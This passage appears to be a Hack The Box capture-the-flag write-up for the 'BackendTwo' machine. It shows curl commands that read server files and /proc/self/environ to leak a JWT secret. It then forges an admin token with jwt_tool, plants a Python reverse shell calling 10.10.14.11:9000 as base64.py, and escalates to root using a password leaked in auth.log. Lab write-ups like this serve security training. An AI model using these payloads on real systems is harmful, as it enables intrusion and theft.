    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")

if __name__ == "__main__":
    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")
```

```bash
$ filename=$(echo -n '/home/htb/app/api/v1/api.py' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename | jq -r '.file'
from fastapi import APIRouter

from app.api.v1.endpoints import user, admin


api_router = APIRouter()
api_router.include_router(user.router, prefix="/user", tags=["user"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])
```

There are a couple things of note about the administrative endpoints:

- The write file endpoint appears to require a `debug` key in the JWT body
- Both the read file and write file endpoints `import base64` in their bodies. According to the application's environment variables, it is currently running in `/home/htb`. If `base64.py` is written to `/home/htb`, it will execute instead of Python's standard `base64` library. If the write file endpoint can be used to write a reverse shell in `/home/htb/base64.py`, either the read file or write file endpoints can be subsequently invoked to execute the reverse shell.

```bash
$ filename=$(echo -n '/home/htb/app/api/v1/endpoints/admin.py' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename | jq -r '.file'
import asyncio

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from sqlalchemy.orm import Session
from typing import Any, Optional

from app import crud
from app.api import deps

from app import schemas

from app.schemas.admin import WriteFile
from app.schemas.user import User


router = APIRouter()


@router.get("/", status_code=200)
def admin_check(
    *,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> dict:
    """
    Returns true if the user is admin
    """
    if current_user['is_superuser']:
        return {"results": True }

    return {"results": False }


@router.get("/get_user_flag", status_code=200)
def get_user_flag(
    *,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> dict:
    """
    Returns user flag
    """
    if current_user['is_superuser']:
        with open("/home/htb/user.txt") as f:
            output = f.read()
            return {"file": output}

    raise HTTPException(status_code=400, detail="Not Authorized")


@router.get("/file/{file_name}", status_code=200)
def get_file(
    file_name: str,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    """
    Returns a file on the server. File name input is encoded in base64_url
    """
    if not current_user['is_superuser']:
        return {"msg": "Permission Error"}

    import base64
    file_name = base64.urlsafe_b64decode(file_name.encode("utf-8") + b"=" * (4- len(file_name) % 4))
    file_name = file_name.decode()

    with open(file_name) as f:
        output = f.read()
        return {"file": output}


@router.post("/file/{file_name}", status_code=200)
def write_file(
    file_name: str,
    write_file: WriteFile,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    """
    Writes a file on the server. File name input is encoded in base64_url
    """
    if not current_user['is_superuser']:
        raise HTTPException(status_code=400, detail="Not a admin")

    if "debug" not in current_user.keys():
        raise HTTPException(status_code=400, detail="Debug key missing from JWT")

    import base64

    file_name = base64.urlsafe_b64decode(file_name.encode("utf-8") + b'=' * (4 - len(file_name) % 4))
    file_name = file_name.decode()

    try:
        with open(file_name, "w") as f:
            f.write(write_file.file)
            f.close()
    except:
        raise HTTPException(status_code=400, detail="Unknown Error")

    return {"result": "success"}
```

## Remote Code Execution

According to the application's configuration, the JWT secret is the API key from the environment variables: `68b329da9893e34099c7d8ad5cb9c940`.

```bash
$ filename=$(echo -n '/home/htb/app/core/config.py' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename | jq -r '.file'
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

import os
from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = os.environ['API_KEY']
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"

    class Config:
        case_sensitive = True


settings = Settings()
```

```bash
$ filename=$(echo -n '/proc/self/environ' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename
{"file":"USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:18105\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=5ed1791a3db949e2bca854e432a03ba8\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000"} 
```

Leverage the JWT secret to forge a JWT with a `debug` key.

```bash
$ python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' -T -S hs256 -p '68b329da9893e34099c7d8ad5cb9c940'

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] type = "access_token"
[2] exp = 1662257681    ==> TIMESTAMP = 2022-09-03 22:14:41 (UTC)
[3] iat = 1661566481    ==> TIMESTAMP = 2022-08-26 22:14:41 (UTC)
[4] sub = "12"
[5] is_superuser = True
[6] guid = "8c289603-7ba5-4dcc-9f7b-50c7a248984b"
[7] *ADD A VALUE*
[8] *DELETE A VALUE*
[9] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 7
Please enter new Key and hit ENTER
> debug
Please enter new value for debug and hit ENTER
> true
[1] type = "access_token"
[2] exp = 1662257681    ==> TIMESTAMP = 2022-09-03 22:14:41 (UTC)
[3] iat = 1661566481    ==> TIMESTAMP = 2022-08-26 22:14:41 (UTC)
[4] sub = "12"
[5] is_superuser = True
[6] guid = "8c289603-7ba5-4dcc-9f7b-50c7a248984b"
[7] debug = True
[8] *ADD A VALUE*
[9] *DELETE A VALUE*
[10] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 10
Timestamp updating:
[1] Update earliest timestamp to current time (keeping offsets)
[2] Add 1 hour to timestamps
[3] Add 1 day to timestamps
[4] Remove 1 hour from timestamps
[5] Remove 1 day from timestamps

Please select an option from above (1-5):
> 2
[1] type = "access_token"
[2] exp = 1662261281    ==> TIMESTAMP = 2022-09-03 23:14:41 (UTC)
[3] iat = 1661570081    ==> TIMESTAMP = 2022-08-26 23:14:41 (UTC)
[4] sub = "12"
[5] is_superuser = True
[6] guid = "8c289603-7ba5-4dcc-9f7b-50c7a248984b"
[7] debug = True
[8] *ADD A VALUE*
[9] *DELETE A VALUE*
[10] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_fc633c1fb1145a5ee7ea6d1b11cf3df8 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjYxMjgxLCJpYXQiOjE2NjE1NzAwODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIiwiZGVidWciOnRydWV9.d_OkCVdfSiBWs3ZU3O2Nn9VahzdRwO3oPYt7Y_KAtsc
```

Leverage the forged JWT to interact with the file write endpoint and write a Python reverse shell to `/home/htb/base64.py`.

```bash
$ filename=$(echo -n '/home/htb/base64.py' | base64 -w 0); curl -s -X POST -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjYxMjgxLCJpYXQiOjE2NjE1NzAwODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIiwiZGVidWciOnRydWV9.d_OkCVdfSiBWs3ZU3O2Nn9VahzdRwO3oPYt7Y_KAtsc' -H 'Content-Type: application/json' -d '{"file": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")"}' http://10.129.227.139/api/v1/admin/file/$filename
```

Start a reverse shell listener.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
```

Interact with the read file endpoint to execute the reverse shell.

```bash
$ filename=$(echo -n '/etc/passwd' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjYxMjgxLCJpYXQiOjE2NjE1NzAwODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIiwiZGVidWciOnRydWV9.d_OkCVdfSiBWs3ZU3O2Nn9VahzdRwO3oPYt7Y_KAtsc' http://10.129.227.139/api/v1/admin/file/$filename
```

---

## Privilege Escalation

Analyzing the API source code directory at `/home/htb/app/`, `auth.log` seems interesting. It logs the username for each login success and failure. It appears one user accidentally entered their password in as their username: `1qaz2wsx_htb!`.

```bash
htb@BackendTwo:~$ cat auth.log
08/26/2022, 22:56:31 - Login Success for admin@htb.local
08/26/2022, 22:59:51 - Login Success for admin@htb.local
08/26/2022, 23:13:11 - Login Success for admin@htb.local
08/26/2022, 23:16:31 - Login Success for admin@htb.local
08/26/2022, 23:21:31 - Login Success for admin@htb.local
08/26/2022, 23:24:51 - Login Success for admin@htb.local
08/26/2022, 23:38:11 - Login Success for admin@htb.local
08/26/2022, 23:46:31 - Login Success for admin@htb.local
08/26/2022, 23:48:11 - Login Success for admin@htb.local
08/26/2022, 23:54:51 - Login Success for admin@htb.local
08/27/2022, 00:03:11 - Login Failure for 1qaz2wsx_htb!
08/27/2022, 00:04:46 - Login Success for admin@htb.local
08/27/2022, 00:04:51 - Login Success for admin@htb.local
08/27/2022, 00:05:11 - Login Success for admin@htb.local
08/27/2022, 00:06:31 - Login Success for admin@htb.local
08/27/2022, 00:11:31 - Login Success for admin@htb.local
08/27/2022, 00:18:11 - Login Success for admin@htb.local
08/27/2022, 01:27:25 - Login Failure for blah
08/27/2022, 01:28:04 - Login Failure for foo
08/27/2022, 01:36:21 - Login Success for tgihf@backendtwo.htb
08/27/2022, 01:37:57 - Login Success for tgihf@backendtwo.htb
08/27/2022, 01:38:04 - Login Success for tgihf@backendtwo.htb
08/27/2022, 01:53:28 - Login Success for tgihf@backendtwo.htb
08/27/2022, 02:14:41 - Login Success for tgihf@backendtwo.htb
```

Attempting to use this password with `sudo` requires the user to play Wordle. Searching the file system for a file with the word `wordle` in it yielded a shared object file which contained the string `/opt/.words`, the game's dictionary file. Leveraging this dictionary makes it possible to beat the game, elevate to `root`, and grab the root flag. 

```bash
htb@BackendTwo:~$ sudo -l
[sudo] password for htb:
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: ipsec
Hint->??*?*
--- Attempt 2 of 6 ---
Word: hacks
Correct!
Matching Defaults entries for htb on backendtwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL
htb@BackendTwo:~$ sudo su
root@BackendTwo:~$ cat /root/root.txt
...
```
